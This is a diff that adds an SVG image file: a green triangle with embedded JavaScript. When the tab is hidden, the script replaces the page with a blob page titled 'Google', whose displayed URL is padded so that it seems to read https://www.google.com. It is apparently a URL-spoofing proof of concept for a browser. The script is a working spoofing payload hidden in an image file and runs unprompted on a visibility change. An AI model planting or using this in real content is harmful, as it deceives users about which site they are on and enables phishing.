@@ -1,0 +1,16 @@
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+   document.addEventListener("visibilitychange", function() {
+      if (document.hidden == true){
+      html = "&#60;h1 style='font-size:100px'&#62;Google is here!&#60;/h1&#62;&#60;script&#62;document.title='Google';history.replaceState('','','blob:http://127.0.0.1/                                                        https://www.google.com')&#60;\/script&#62;";
+        blob = new Blob([html], {type: 'text/html'});
+    url = URL.createObjectURL(blob);
+    window.open(url,"_self");
+   }
+});
+
+   </script>
+</svg>
